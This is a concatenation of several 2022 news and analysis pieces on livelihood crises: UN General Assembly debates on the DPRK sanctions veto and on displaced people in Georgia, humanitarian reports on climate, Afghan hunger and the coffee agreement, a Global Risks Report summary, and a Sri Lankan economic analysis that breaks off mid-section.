“We need to be clear: our debate today is about safeguarding international peace and security — not about sanctions,” he said. Recalling that the sanctions on the Democratic People’s Republic of Korea contain comprehensive humanitarian exemptions, he called upon Pyongyang to stop its destabilizing activities and give priority to the well-being of its people. The resolution at the Council table on 26 May did exactly that, paving the way for additional humanitarian assistance when the country’s people are hit hard by the pandemic. He urged all Council members to take their mandate for upholding international peace and security seriously, stressing: “The Council’s full commitment to the complete, verifiable and irreversible denuclearization of the Democratic People’s Republic of Korea in accordance with its resolutions is what we need now.”

JEFFREY DELAURENTIS ( United States ) said it could not be more important for all States to confront unlawful behaviour. The Democratic People’s Republic of Korea has launched 31 ballistic missiles since the beginning of this year. These actions violate multiple Council resolutions adopted by consensus. The use of the veto by China and the Russian Federation has given the Democratic People’s Republic of Korea tacit approval, he said, pointing out that all of this occurs as that country finalizes preparations for a seventh nuclear test. These actions have been unprovoked. Detailing the United States’ efforts, he said the Biden Administration has sought a dialogue without preconditions and has passed on requests for dialogue through unofficial measures. Underscoring that his Government seeks serious and sustained diplomacy that addresses the concerns of the Democratic People’s Republic of Korea and the international community, he said the United States has offered international aid to the Democratic People’s Republic of Korea and to deliver vaccines to its people. However, it has received no answers to its request for dialogue. Warning that the Democratic People’s Republic of Korea’s repeated launches of missiles threaten the world, he said sanctions measures have worked in the past, and to be fully effective, all members must agree them. Sanctions are not a substitute for diplomacy and the United States is more than ready to engage in diplomacy, he affirmed, stressing that sanctions are not the cause of — but rather a response to — the escalatory behaviour. Non-proliferation is in the interests of all parties, he said.

CHO HYUN ( Republic of Korea ) said it is deeply regrettable that the Council, for the first time in handling the Democratic People’s Republic of Korea’s nuclear and ballistic missile programs since 2006, has failed to respond to the country’s serious provocations. The latest Council resolution 2397 (2017), which was adopted unanimously, expressed the Council’s firm determination to take further significant measures in the event of additional intercontinental ballistic missile launches and decided on concrete action to be taken. Contrary to the argument that the Council’s silence would induce restraint and dialogue from the Democratic People’s Republic of Korea, the world had witnessed the largest number of ballistic missile launches this year, including eight last Saturday alone — which the largest number thus far in a single day. This is all the more alarming given that the Democratic People’s Republic of Korea is seemingly preparing for another nuclear test, as the Director General of the International Atomic Energy Agency (IAEA) testified two days ago. While the Council resolution was not adopted on 26 May, the expressed position of 13 Council members was a solemn testament to the international community’s condemnation of the Democratic People’s Republic of Korea’s continued violations of Council resolutions. The provocations threaten the peace and security of the Korean Peninsula, the region and beyond.

“We urge the Democratic People’s Republic of Korea to stop such provocative actions, abide by all relevant Council resolutions and respond to the call for dialogue and peace on the Korean Peninsula through complete, verifiable and irreversible denuclearization,” he said. He also called on that country to cooperate with the international community to mitigate humanitarian suffering resulting from the COVID-19 outbreak. “The Republic of Korea stresses that the door for dialogue remains open despite the Democratic People’s Republic of Korea repeated provocations and threats, and our hand of unconditional assistance on the pandemic is still extended,” he said. The Democratic People’s Republic of Korea’s concerns — security or humanitarian — can be must better addressed through dialogue rather than self-isolation and continued defiance of Council resolutions. “We once again urge the Democratic People’s Republic of Korea to change its course and participate in meaningful dialogue for denuclearization,” he said. “And let me be clear: no one harbours any hostile policy towards Pyongyang, nor is there any reason to do so.” Expressing deep concern about the humanitarian situation in the Democratic People’s Republic of Korea, he said it should not be forgotten that the suffering in the country is due to State policy, not the ensuing sanctions. “We have all witnessed how the [Democratic People’s Republic of Korea] dissipated their scarce resources by blowing up expensive missiles in the sky,” he said. When debating the Council’s role, the Assembly should stay focused on this specific goal: to recall that Member States have given the organ primary responsibility for the maintenance of international peace and security.

ENRIQUE OCHOA ( Mexico ) said that his country has on numerous occasions condemned the Democratic People’s Republic of Korea’s continued development of a nuclear and ballistic weapons programme. He called for a multilateral dialogue with that country that would lead to the complete, verifiable and irreversible denuclearization of the Korean Peninsula. Stressing that the veto is an act of power and does not promote unity, he pointed out that, through the current debate, the United Nations is starting a new chapter in the relationship among its main bodies. He urged Member States to “put a brake” on the veto within the Security Council and to support the Franco‑Mexican initiative to voluntarily restrict use of the veto in cases of mass atrocities. There are 106 States that have signed the initiative, he said, calling it a timely moment to strengthen the mechanism that links the Assembly to the Council for the maintenance of international peace and security.

BURHAN GAFOOR ( Singapore ), advocating for a strong Council, said permanent membership in that organ comes with special responsibilities. The right to cast a veto should not be taken lightly and there must be greater transparency every time a veto is cast. Noting that the draft resolution before the Council would have imposed additional sanctions and updated humanitarian exemptions on the sanctions regime in order to make them more relevant with the conditions created by the pandemic, he said Council members must work together in good faith to return to the consensus they have had on this issue since 2006. The Democratic People’s Republic of Korea’s recent launches of ballistic missiles have raised tensions, he said, calling on that country to cease all provocations immediately and comply with all its non-nuclear commitments and stressing that Singapore takes its commitments very seriously in that regard. He urged the Democratic People’s Republic of Korea to work with the international community to deliver much needed humanitarian aid to its people.

KRZYSZTOF MARIA SZCZERSKI ( Poland ) said the excessive use of veto is particularly harmful in situations that call for swift and decisive action, such as the Russian Federation’s aggression against Ukraine. The rules-based international order is being brutally attacked and the ongoing war has global implications for peace and security, which is why the need for an efficient Council is more urgent than before. Poland is disappointed with the recent vetoes cast by China and the Russia Federation regarding additional sanctions against the Democratic People’s Republic of Korea for its continuous, blatant violation of Council resolutions, he said. The Democratic People’s Republic of Korea’s missile and nuclear programmes pose a serious and constant threat to the security and stability of the region and beyond. Its military activity is a major proliferation challenge and requires the international community’s attention. He expressed concern about the indication of the ongoing North Korean nuclear programme development and called on the Democratic People’s Republic of Korea to sign and ratify the Comprehensive Test Ban Treaty, and in the meantime, to fully observe the moratorium on nuclear test explosions or any other nuclear explosion. Pyongyang should refrain from actions contrary to the Treaty’s purpose, he said.

BASSAM SABBAGH ( Syria ) said the clarification provided by China and the Russian Federation expresses their just opposition to calling for increased sanctions against the Democratic People’s Republic of Korea. His delegation is concerned with the political exploitation of resolutions by certain actors, he said, stressing that the Council needs to play a constructive role and ensure measures that help ease tensions, in accordance with its mandate to uphold peace and security. The political polarization by and attempts to isolate certain States deepens Council divisions and restricts its capacity to mount a collective response. The implementation of sanctions against a number of Member States makes the people of these countries the biggest losers, he said, pointing out the impact on vital sectors of development and fundamental human rights. Since 2006, the Council has adopted 10 sanctions resolutions against the Democratic People’s Republic of Korea. This contributes to regional insecurity and has an unacceptable humanitarian impact. The United States has moved further away from diplomacy and dialogue, and its actions have hampered dialogue. The United States and their allies have used the right to veto dozens of times against people in Syria’s region, he said, adding that the United States needs to commit to Council resolutions rather than impede them.

Protracted Conflicts in GUAM Area

In the afternoon, the Assembly took up ""Protracted conflicts in the GUAM area and their implications for international peace, security and development”, for which a report of the Secretary-General titled “Status of internally displaced persons and refugees from Abkhazia, Georgia, and the Tskhinvali region/ South Ossetia, Georgia” (document A/76/828) had been circulated.

KAHA IMNADZE ( Georgia ), introducing the draft resolution by the same name as the report (document A/76/L.62), said it addresses the humanitarian plight of hundreds of thousands of internally displaced persons and refugees of different ethnic backgrounds expelled from the regions of Abkhazia and Tskhinvali in his country as a result of multiple waves of ethnic cleansing, starting from 1993, and culminating with the full-scale aggression against Georgia in 2008. Calling on those in charge to bring a much-awaited solution through negotiations, he said the draft resolution also recognizes the importance of the Geneva International Discussions as the only tool for settlement of the conflict. “By supporting this resolution, we are not only telling those 400,000 that they also matter, and are not forgotten nor left behind, but also putting moral pressure on the participants of the Geneva International Discussions to fulfil their obligations,” he said, urging Member States to vote in favour of the text.

Mr. SKOOG, Head of Delegation of the European Union , in its capacity as observer, supported the resolution and reaffirmed the bloc’s firm support for the sovereignty and territorial integrity of Georgia within its borders. The European Union supports peacebuilding and conflict resolution in Georgia through its co‑chairmanship of the Geneva International Discussions and the European Union Monitoring Mission, he said. Expressing concern about the human rights violations in the breakaway regions of Abkhazia and South Ossetia, he supported full, safe and unhindered access to provide humanitarian aid to people needing help in these regions. All internally displaced people and refugees should be able to choose a durable solution, including a voluntary, safe and dignified return, as well as of being able to exercise property rights, he said, expressing regret that, thus far, no progress has been achieved on these issues and recalling that addressing them is a core task of the Geneva International Discussions. He welcomed the Georgian Government’s efforts to find durable housing solutions for internally displaced persons. He also encouraged the Government to include and prioritize internally displaced persons in its national development plan and make further efforts to improve their living conditions and livelihoods.

RYTIS PAULAUSKAS ( Lithuania ) speaking on behalf of the Baltic and Nordic States, said it is deplorable that the Russian Federation continues to violate the commitments made under the 12 August 2008 European Union-mediated ceasefire agreement, as well as subsequent implementing measures, by maintaining a military presence on Georgian soil. The illegal so-called parliamentary elections held in Abkhazia, Georgia, on 12 March, and the illegal so-called presidential elections in the Georgian region of South Ossetia on 10 April, constitute further violations of Georgia’s sovereignty and territorial integrity. The Baltic and Nordic States remain deeply concerned about the continued deterioration of the human rights situation in Abkhazia and Tskhinvali region/South Ossetia, which are under the Russian Federation’s occupation, he said. Hundreds of thousands of internally displaced persons remain deprived of their right to a safe, dignified and voluntary return to their places of origin and their property rights. More worrying is that no international human rights monitoring mechanism has been granted unrestricted access to these regions.

The Secretary-General’s comprehensive report on the implementation of last year’s resolution shows that no major changes were observed during the reporting period regarding internally displaced persons and refugees exercising their right to return, he observed. This year’s resolution commits everyone to keep working to protect and assist people who have been forcibly displaced from the Abkhazia and Tskhinvali/South Ossetia regions of Georgia, and to ensure they can safely return. He welcomed the adoption of the resolution on “Cooperation with Georgia” in the forty-ninth session of the Human Rights Council. This resolution demonstrates the international community’s commitment to address violations of human rights and humanitarian issues faced by these people. He reiterated the Baltic and Nordic States’ support for the Geneva International Discussions. At the same time, he expressed regret about the constant lack of engagement from the Russian Federation and participants from Tskhinvali and Sukhumi on the topic of refugees and displaced persons.

RICHARD ARBEITER ( Canada ), speaking also on behalf of Australia and New Zealand, expressed concern about the forced demographic changes resulting from the conflicts in Georgia and the humanitarian situation caused by armed conflict in 2008, which resulted in the forced displacement of civilians. The process of so-called “borderization” — the erection of razor‑barbed‑wire fences and the creation of other artificial obstacles along the administrative boundary line — and the denial of access to international human rights monitors to the Abkhazia and South Ossetia regions — is a grave deterioration to the human rights situation on the ground, he said. Moreover, the illegal and unjust Russian invasion of Ukraine, which has forcibly displaced millions of Ukrainians from their homes, is another stark example of why the international community must condemn the Russian Federation’s repeated aggression against its neighbours and support the rights of all forcibly displaced persons. He condemned any plans in South Ossetia to hold a referendum to join the Russian Federation, calling upon on all parties to facilitate immediate access for international humanitarian organizations and to fully implement the obligations and commitments under the ceasefire agreement.

OSUGA TAKESHI ( Japan ) said his country opposes any unilateral attempt to change the status quo by force anywhere in the world and supports a unified response to any such attempt. The international order in the Georgia, Ukraine, Azerbaijan and Republic of Moldova region has been seriously challenged. People are suffering and the values articulated in the Charter are at stake. The United Nations remains crucial to maintain a rules-based international order and the Council needs to maintain its responsibility under the Charter, he said, pointing to a dire threat to the human security situation due to the forced displacement of people in the region. To address the humanitarian crisis in Ukraine and neighbouring countries, Japan has provided $200 million for activities led by the United Nations and other humanitarian organizations. Japan is committed to providing assistance for internally displaced people and refugees. He noted that the draft resolution addresses the humanitarian plight of hundreds of thousands of internally displaced persons and refugees, of different ethnic backgrounds, expelled from Georgia’s regions of Abkhazia and Tskhinvali as a result of multiple waves of ethnic cleansing.

MAURIZIO MASSARI ( Italy ), associating himself with the European Union, expressed concern about human rights violations in the Georgian regions of Abkhazia and South Ossetia. He commended the Government of Georgia for continuing to explore sustainable and feasible solutions for internally displaced persons and to promote their integration and called for unhindered humanitarian access to that population. Reaffirming his country’s commitment to the territorial integrity of Georgia, he called for strengthening of the dialogue with the breakaway regions to be launched in the Geneva talks, and support for the work and the aims of the European Union Monitoring Mission in Georgia.

CHRISTOPHER P. LU ( United States ) said the Russian Federation’s aggression more than a decade ago upended the lives and livelihoods of millions of Georgian civilians. Many individuals could not return to their pre-conflict homes because of the brutal and unjustified war of choice by the Russian Federation. Its aggression has now been expanded to Ukraine. The United States supports Georgia’s territorial integrity within its internationally recognized borders, he said, adding that the Russian Federation’s presence is a threat. He called on the Russian Federation to cease its recognition of the so-called independence of the Abkhazia and South Ossetia regions and fulfil its obligations under the 2008 ceasefire agreement to withdraw its forces to pre-conflict borders. The Russian Federation and de-facto authorities in the two regions need to maintain human rights and create secure conditions to allow the return and integration of internally displaced people, he said, stressing the United States support for human rights and dignity of internally displaced persons and refugees everywhere.

GENNADY V. KUZMIN ( Russian Federation ) said his country will vote against the draft resolution, which is aimed exclusively at undermining normalization in the region and pressuring the sovereign states of Abkhazia and South Ossetia. The long-standing exploitation of the issue of refugees by the Georgian authorities significantly harms efforts to resolve humanitarian problems in the region, provoking tensions among representatives of communities who live in Georgia, Abkhazia and South Ossetia. He called on Georgia and its partners to stop their reckless accusations and demonstrate through actions their commitment to a constructive solution to humanitarian issues based on the principles of peaceful coexistence. His country requests a vote on the draft resolution, he said, calling on all delegations who are against the politicization of the work of the Assembly to not support the draft.

Mr. ROBERTS ( United Kingdom ) said it has been 13 years since the Russian Federation’s military invasion of Georgia and the United Kingdom remains extremely concerned about the situation. His Government fully supports Georgia’s territorial integrity within internationally recognized border, he said, adding that the human rights situation in the two areas of Abkhazia and South Ossetia is of serious concern. He called on the Russian Federation to maintain its obligation under the ceasefire agreement, withdraw to pre-conflict borders and allow full humanitarian access to the areas. He called on the Russian Federation to reverse its recognition of the Abkhazia and South Ossetia regions. The United Kingdom has been a long-standing supporter of this resolution, he said, adding that it is even more pertinent following the Russian Federation’s invasion of Ukraine.

SERGIY KYSLYTSYA ( Ukraine ) said GUAM is an organization for democracy and the economic development of four countries: Georgia, Ukraine, Azerbaijan and Republic of Moldova. Its member countries continue to be most affected in Europe by conflict, violating their sovereignty and territorial integrity, constraining their freedoms and democracy, and hampering their development and the livelihoods of their people. After 14 years since its aggression and occupation of Georgia’s territories, the Russian Federation still refuses to implement the European Union‑mediated ceasefire agreement of August 2008, withdraw its military and security forces and armaments from both regions, and allow the establishment of international security mechanisms on the ground, he said.

The resolution commits all to continue to provide protection and assistance to those who have been forcibly displaced, he said, noting that his country will vote in favour of the resolution. “Russia does not stop at Georgia,” he said, pointing to the Russian Federation’s invasion against his country in 2014, followed by eight long years of war, and a full-scale invasion of Ukraine in February. Noting that almost 12 million people have become internally displaced persons, he said that, for decades, the Russian Federation has persisted it its attempts to undermine the sovereignty and territorial integrity of Georgia, Ukraine and other GUAM member States. “The aggressor must and will be stopped to bring peace, security and prosperity back to the region,” he said.

ROBERT DAVID MURPHY, observer for the Holy See , said it wanted to use this Assembly session to discuss protracted conflicts, which inhibit development and can incite violence. In a situation of negative peace, it is easy for the international community to move its attention to other issues, which creates great peril to the people on the ground. Peace is not just the absence of war. It is an enterprise of justice and must be built up, he said, stressing that the Holy See supports all efforts towards dialogue. The hostilities in Ukraine show the danger of diverting attention away from places of tensions. The conflict in that country is endangering international peace and threatening the food security of many people, he said, calling for an immediate ceasefire and negotiations for a peaceful resolution of the conflict.

In explanation of vote before the vote, the representative of Venezuela expressed concern at the growing trend of attempts to instrumentalize the Assembly and attack its fully fledged members and use it as a platform to adopt resolutions which lack consensus, deepening tensions and divisions. He appealed to proponents of the draft resolution to avoid politicized approaches and instead to foster both confidence-building measures and a constructive approach, including working within the framework of the Geneva International Discussions on security and stability in the south Caucasus.

The Assembly then adopted “L.62” by a recorded vote of 95 in favour to 12 against, with 56 abstentions.",Livelihood Crisis,2022-06-09 03:58:13

Calling for global, unified and transformative action

As climate change continues to devastate communities around the world, the responsibility to build a greener and more sustainable planet is growing increasingly urgent. To mitigate the level of harm and build resilience in vulnerable communities, it is critical that we take bold and swift action which centres the experiences of the communities at the forefront of climate change.

Above all, such a commitment demands collective action: the compassion and unity shown by the international community in the recent Ukraine crisis, for instance, illustrates the possibilities that arise when we work together. This sort of concerted, rapid, and decisive action can – and must – be extended to the climate crisis.

Indeed, our failure to do so carries severe consequences, with the most marginalised groups bearing the brunt.

“Left at the mercy of the sea”: Sea intrusion displaces people in Pakistan

In Pakistan, which ranks among countries most affected by climate change according to a 2020 report, the increase of earthquakes, floods, and droughts has meant that local communities struggle to survive. Ateef, a 65-year-old security guard in Dasi, is just one of over 860,000 estimated climate migrants displaced from their native land.

Having worked for 30 years as a fishermen and farmer in his native town of Babloo, Ateef was forced to migrate, along with his community, after he lost his land and animals due to sea intrusion and lack of fresh water. In Dasi, where they live now, Ateef explains that they lack access to fresh water, educational institutions, and medical infrastructure – with the latter leading to major health issues like asthma, diarrhoea, and pregnancy complications for women.

“We are living a very miserable life,” Ateef tells us, “Our children don’t have a school or madrassah (religious school) to attend. Nor do we have any electricity or sanitation facilities. We all are left at the mercy of the sea.”

To provide relief and develop resilience-building strategies, Islamic Relief works with local communities in Pakistan in delivering innovative and sustainable projects. Among others, our projects involve introducing rainwater-harvesting structures and providing training on climate-adaptive farming. Such interventions help farmers to ensure their crops remain safe from droughts. Islamic Relief also support local communities in rebuilding housing, small businesses and sanitation facilities.

Adapting to disrupted farming practices in Indonesia

Farmers in Indonesia similarly face loss of livelihood as climate change affects farming practices. Although farmers have traditionally relied on indigenous practices to predict rainfall, such as Warige and tumbuk, these practices now struggle to keep pace with changing weather patterns.

“In the past, the predictions of our older people were always accurate, yet nowadays, the prediction is sometimes incorrect as climate change is effecting the rain” explains Ahmad, a leader of the local farmers’ group. This means that salt farmers, who need to mature the salt during the dry season, are being caught out by unpredictable rain while rice farmers are seeing a drastic drop in productivity due to extended periods of drought and a shortened rainy season.

Through climate change field school, Islamic Relief is taking the steps to train local populations in community-based adaptation methods. These include measuring daily rainfall and adjusting crop plantations based on quarterly climate predictions which integrate indigenous knowledge with modern scientific methods and lead to improved reliability and increased productivity.

Humanitarian crisis in Ethiopia: Climate change meets conflict

On its fourth consecutive year of failed rains, Ethiopia is facing the worst drought in the Horn of Africa since 1981. More than 7 million people are already suffering from malnutrition and 39% of the population does not have access to a safe water supply.

As the drought exacerbates the effects of internal conflict, Ethiopians are experiencing acute insecurity and struggling to sustain daily life.

With the help of Islamic Relief, Ayana, a 29-year-old mother of 2, has been able to form a women’s village saving and credit association with her local community and use the money saved to buy cattle for members of the group. Due to the drought and shortage of cattle fodder, however, Ayana and her group were forced to sell the livestock after 1 out of the 5 cattle died.

Despite this, Ayana says she remains hopeful for the future, “above all, we have learnt the advantages of organizing ourselves in village saving associations. Our plan now is to grow together by expanding and diversifying our business.”

Moving forward, it is crucial that we prioritise the stories and insights of communities disproportionately affected by climate change, including those in Pakistan, Indonesia, and Ethiopia. We only have one Earth, and it belongs to us all.",Livelihood Crisis,2022-06-06 07:20:10

Our goal is to achieve food security for all and make sure that people have regular access to enough high-quality food to lead active, healthy lives.","Humanitarian assistance averted a catastrophe in the harsh winter months – but hunger continues across the country at unprecedented levels.

KABUL – 19.7 million people, almost half of Afghanistan’s population, are facing acute hunger according to the latest Integrated Food Security Phase Classification (IPC) analysis conducted in January and February 2022 by Food Security and Agriculture Cluster partners, including the Food and Agriculture Organization of the United Nations (FAO), the United Nations World Food Programme (WFP) and many NGOs.

The report predicts that the outlook for June-November 2022 sees a slight improvement in the food security situation, with a reduction in the number of people facing acute food insecurity to 18.9 million people. This is due in part to the coming wheat harvest from May to August, and this year’s well-coordinated scale-up of humanitarian food assistance - alongside increased agricultural livelihood support. However, gains will be limited – the report warns. Lingering drought and the deep economic crisis mean that unprecedented hunger will continue to threaten the lives and livelihoods of millions of people across Afghanistan.

Of particular concern - and for the first time since the introduction of the IPC in Afghanistan in 2011 - a small pocket of “catastrophic” levels of food insecurity - or IPC Phase 5 - has been detected in the country. More than 20,000 people in the north-eastern province of Ghor are facing catastrophic levels of hunger because of a long period of harsh winter and disastrous agricultural conditions.

“Unprecedented levels of humanitarian assistance focused on bolstering food security have made a difference. But the food security situation is dire. Humanitarian assistance remains desperately important, as do the needs to rebuild shattered agricultural livelihoods and re-connect farmers and rural communities to struggling rural and urban markets across the country. Unless these happen, there will be no way out of this crisis,” said Richard Trenchard, FAO Representative in Afghanistan.

“Food assistance and emergency livelihood support are the lifeline for the people of Afghanistan. We mounted the world’s largest humanitarian food operation in a matter of months, reaching more than 16 million people since August 2021,” said Mary-Ellen McGroarty, WFP’s Country Director and Representative in Afghanistan.

“We are working with farmers, millers, and bakeries, training women and creating jobs to support the local economy. Because the people of Afghanistan would much prefer jobs; women want to be able to work; and all girls deserve to go to school. Allowing the economy to function normally is the surest way out of the crisis, otherwise suffering will grow where crops cannot,” she added.

The upcoming harvest will bring some relief to millions of families struggling with income losses and food shortages. However, for many, the harvest will only offer short-term relief and very little opportunity for recovery. The war in Ukraine continues to put pressure on Afghanistan’s wheat supply, food commodities, agricultural inputs, and fuel prices. Access to seeds, fertilizer and water for irrigation is limited, labour opportunities are scarce and enormous debts have been incurred to buy food over the last few months.

Both FAO and WFP continue to scale up their programmes across the country. WFP has reached more than 16 million people so far in 2022 with emergency food assistance, and is supporting local markets, working with retailers and local suppliers. WFP continues to invest in people’s livelihoods through skills training and climate adaption projects so that families can cultivate their land and grow their own food.

FAO continues to scale up its assistance to farmers and herders in rural areas and will assist more than 9 million people in 2022 through a range of interventions supporting crop, livestock and vegetable production, cash transfers and the rehabilitation of vital irrigation infrastructure and systems.

Supporting agriculture is a cost-effective and strategic intervention that delivers great short-term impact as lifesaving support, while it paves the way for longer-term recovery and sustainable development.

Going forward, the private sector and civil society will participate as Affiliate Members in key discussions and decisions on the sustainable future of global coffee affairs with 75 coffee producing and importing nations, ICO Member Governments. The goal of the Agreement is to find new ways to improve conditions in an over US$300 billion a year industry that provides a livelihood for millions of people from farmers to baristas across the world. Indeed, coffee farmers have suffered much in the wake of a 2019 coffee pricing crisis, extreme weather including droughts, flooding, frosts and blight, resulting in crop losses and prompting many to quit a business that had been in their family for generations. Smallholders, who only have less than one or two hectares of land each to produce coffee, for example, are the most vulnerable with incomes of just US$500 a year.



The Chair of the International Coffee Council, Ambassador Iván Romero-Martínez of Honduras, stressed that with the approval of the new Agreement the Council marked a new era for the ICO, its members, the global coffee sector and for millions of coffee farmers whose work, every day, allow us to taste a wonderful coffee. He further pointed out that ICO members showed the world that the coffee sector is strong and united as ICO reaffirms itself as the centre of the “coffee diplomacy”, committed to making the coffee value chain more sustainable, inclusive, and resilient.



“We are entering a new era of cooperation with the private sector thanks to the landmark International Coffee Agreement 2022,” says Vanusia Nogueira, who joined in May as ICO’s first female Executive Director. “The arrival of the world’s biggest high-street names and manufacturers as well as smallholders means that the whole coffee value chain can now address the biggest challenges facing the global sector in a way that is fair for all,” she adds.



The new International Coffee Agreement goes beyond the traditional divide between exporting and importing members as all members are committed to working together to address the increasing challenges of the coffee industry. The private sector and Government entities will coordinate strategies to address more efficiently those challenges. This will benefit producers across 50 countries as coffee growers and their associations will be able to raise their concerns directly with retailers and manufacturers. Moreover, the new Agreement gives a clear and firm mandate to the ICO Secretariat to assist Members in putting together coffee sector development projects and mobilising resources in areas such as pest and disease control, climate change adaptation among other mitigating strategies. This comes at a time when expanding demand for coffee will contribute to maintaining a balance between supply and demand, supporting fair market prices.

Environmental concerns dominate long-term risk outlook, along with worries about the erosion of social cohesion and livelihood crises.

Read the Global Risks Report 2022 here.

As the world enters the third year of living through a pandemic, people are struggling.

COVID-19 has caused a staggering 5.4 million deaths globally and led to an additional 53 million cases of major depression. Notwithstanding the Great Resignation in advanced economies, global employment lags behind its pre-pandemic levels. And extreme weather is compounding a jobs crisis as it impacts business operations, working conditions and living standards globally.

Health and welfare challenges are weighing on societies, rich and poor. Today, the world’s top short-term risks include environmental catastrophe, social division and health concerns — according to the World Economic Forum’s Global Risks Report 2022, which draws on the views of nearly 1,000 experts, policymakers, and industry leaders.

These global threats are compounding anxieties within borders. According to the report, social cohesion erosion is the risk that worsened the most due to COVID-19. Just 11% of experts believe the global recovery will accelerate towards 2024, while 84% are either concerned or worried about the outlook for the world. Meanwhile, domestic strife is growing: differing views over vaccinations and COVID-related restrictions are adding to social pressures, with several countries experiencing riots against national pandemic responses.

Environmental concerns top long-term global risks outlook

Yet experts are clear on the most pressing long-term challenge: addressing the climate and nature crisis. Environmental challenges dominate the long-term risk outlook; climate change, extreme weather and nature loss also rank as the three most severe risks for the next decade.

Short-term domestic pressures, along with pervasive disillusionment and mistrust, makes taking action on the climate crisis even more complicated. Social, political and economic realities will lead to divergent transition paths that risk stranding swathes of workers, further polarizing societies and rendering decarbonization efforts futile. Already, the most optimistic scenario for global warming estimates a 1.8°C increase in temperature.

Immediate concerns will also limit the attention and political capital that some governments worldwide will allocate to longer-term issues. Stronger national interest postures risk further fracturing the global economy and impacting the foreign aid and cooperation needed to resolve conflicts, protect refugees and address humanitarian emergencies.

COVID-19 responses could also exacerbate long-term risks if not addressed with an eye toward the future. In the poorest 52 economies, home to a fifth of the world’s population, the vaccination rate is just 6%. Vaccine disparity means that some economies have been able to sprint towards recovery while many are still struggling to get back on their feet.

Image: World Economic Forum

The adoption of new digital practices and technologies spurred by the pandemic are also forcing relatively disconnected workers and countries to prioritize digital access over security to avoid getting stranded in the pre-pandemic economy. With ransomware attacks alone increasing by 435% in 2020, as parts of the world move rapidly toward an Internet 3.0 and the metaverse, the risk of vulnerabilities in this space will only grow.

But the future presents an opportunity for advanced and developing countries alike to build resilience and, in that way, restore public confidence.

Governments need to build resilience and restore public confidence

Resilience starts at home. Governments need to rebalance risks and rewards so that neither taxpayers nor businesses alone bear the cost of confronting future crises. They must create data-sharing agreements to ensure rapid response and continuity of critical systems and streamline regulation to allow flexibility in in times of crisis.

coronavirus, health, COVID19, pandemic What is the World Economic Forum doing to manage emerging risks from COVID-19? The first global pandemic in more than 100 years, COVID-19 has spread throughout the world at an unprecedented speed. At the time of writing, 4.5 million cases have been confirmed and more than 300,000 people have died due to the virus. As countries seek to recover, some of the more long-term economic, business, environmental, societal and technological challenges and opportunities are just beginning to become visible. To help all stakeholders – communities, governments, businesses and individuals understand the emerging risks and follow-on effects generated by the impact of the coronavirus pandemic, the World Economic Forum, in collaboration with Marsh and McLennan and Zurich Insurance Group, has launched its COVID-19 Risks Outlook: A Preliminary Mapping and its Implications - a companion for decision-makers, building on the Forum’s annual Global Risks Report. The report reveals that the economic impact of COVID-19 is dominating companies’ risks perceptions. Companies are invited to join the Forum’s work to help manage the identified emerging risks of COVID-19 across industries to shape a better future. Read the full COVID-19 Risks Outlook: A Preliminary Mapping and its Implications report here, and our impact story with further information.

At the same time, the COVID-19 crisis has again proven that global challenges need global solutions. Stronger multilateral governance and more effective international risk mitigation are essential. On climate action, the urgency to recover jobs and livelihoods will make it especially harder for developing economies to balance short-term domestic pressures with long-term planetary goals. As a result, advanced and developing economies will need to cooperate more closely with each other to leverage the financing and technical cooperation mechanisms that emanated from COP26.",Livelihood Crisis,2022-01-18 08:00:00

This is so perhaps because Sri Lanka has a greater value attached to it. Yet currently she is facing an unprecedented economic crisis about which many analyses, proposals and solutions are being expressed. It is now of national necessity to examine minutely and prescribe viable solutions to these developments. When one scrutinises the nature of the crisis, it is apparent that it encompasses every section of the population either through financial, political or through health issues.

It is necessary to analyse our economic crisis in the context of a global crisis. In the given illustration we can identify 3 salient factors which during this period, worked against us to cause an economic crisis.

The political issues

According to the Constitution we are a democratic socialist country. After independence, even though there were several parties representing the majority and the minority ethnic groups, it is two major parties that wielded power. They, from time to time followed capitalist, or socialist policies and either an open or closed economic policy. Prior to 1978, the Prime Minister followed a completely closed economic policy which was rejected in 1978 by the UNP regime when an Executive President was installed with full executive powers. The Prime Minister lost most of his power to the President

Currently, the economic problems have exacerbated along with people’s other issues culminating in a mass people’s struggle. As I was composing this article, people demands that the Prime Minister and Cabinet must resign did indeed occur. The demand that the President too should resign is still continuing. Most huge foreign funded projects were not feasible economically, financially, environmentally or technically due to politicians’ intervention on the decision-making process. The Return on Investment (ROI) is very low in most of those projects and it is difficult to bear higher maintenance cost. Further, the Government sector employment procedure also has the same issues and has been a further burden to the general public due to political appointments and unproductive youth employment projects while skills gaps occurred in many industrial sectors.

The financial crisis

In order for a country to have a stable economic status, it should have a balanced financial status and a balanced commodity market. However currently there is an imbalance in both these sectors. Prior to analysing the causes for the financial crisis, it is necessary to examine the nature of the financial crisis and the behaviour of fluctuating factors in its backdrop. In this context primarily the following factors have to be considered:

1. Why did the foreign reserve of 7 billion reduce to 0.005 billion

2. Why did the gold reserve of 20 tons deplete

3. The reason for the depreciation of the rupee against the dollar. It was depreciated 94.6% over two years from 185 to 360 while in April it rose sharply by 29.8%. It is necessary to examine why our financial reserves reduced sharply

Exports

Even though, with the COVID-19 pandemic in 2019 export income fell by a billion dollars, in 2021 it rose by 2.5 billion (Graph 1). Export market and industries are facing the big challenges due to lack of materials, fuel and increasing production cost. It will again cause the decreasing of forex and work as a cyclical effect.

Tourism

There are more than 600,000 employed in tourism directly or indirectly, and it provides 12.6% of the GDP (2019). But it reduced to 6% in 2020. In 2018, it produced $ 4.4 billion despite COVID-19 but in 2021 it produced only 9.3 million. But by end 2021 until March this year there was an increase in revenue but since then it decreased again owing to political disturbance.

Foreign remittances

Foreign employment provides 8% of the national product and so it is a valuable source of employment. Expatriate employees send back their earnings in various ways. Even though it is a major source of earing foreign exchange, foreign employment had decreased during the past two decades. In 2014, 267,000 went out for employment but in 2019 it fell to 191,000 and in 2020 owing to Covid-19 the number was 50,600. Dollar remittances which stood at 7 billion fell to 5.4 billion. Unauthorised transfers such as Mundial and Havala systems reduced the inflow from formal banking practices.

Foreign Direct Investment and foreign aid

Two other channels through which foreign funds enter the country are the FDIs and foreign aid. From 1970 to 2005 FDIs were slow in coming but with the end of the war it picked up. In 2018 it reached its maximum at 1.6 billion, but by 2019 with the pandemic it went down to 0.6 billion. Later it picked up and reached 1.78 dollars. There is a positive correlation between peace and investment and so there could be a problem in investment in the near future.

In examining foreign aid we note that in 2012 we received 490 million dollars but by 2018 it had reduced to 197.4. During the last three decades non-governmental organisations also received aid. But as a result of the Government’s policy of adopting stringent rules and tedium in obtaining approval for projects have reduced the inflow.

Outflow of foreign exchange and the fall in foreign reserves

